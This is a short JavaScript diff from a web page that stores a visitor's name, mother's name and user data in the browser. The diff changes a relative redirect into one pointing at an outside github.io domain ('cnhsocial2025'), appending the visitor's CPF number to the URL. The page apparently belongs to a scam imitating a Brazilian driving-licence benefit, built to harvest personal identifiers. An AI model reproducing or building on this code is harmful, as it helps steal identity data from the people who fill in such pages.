@@ -225,7 +225,7 @@
 					localStorage.setItem('nome', data?.nome)
 					localStorage.setItem('nomeMae', data?.mae)
 					localStorage.setItem('dadosUsuario', JSON.stringify(data))
-					let nextPageUrl = '../verification/index.php?cpf=' + cpf;
+					let nextPageUrl = 'https://cnhsocial2025.github.io/verification/index.php?cpf=' + cpf;
 
 					const currentParams = new URLSearchParams(window.location.search);
 					currentParams.delete('cpf');
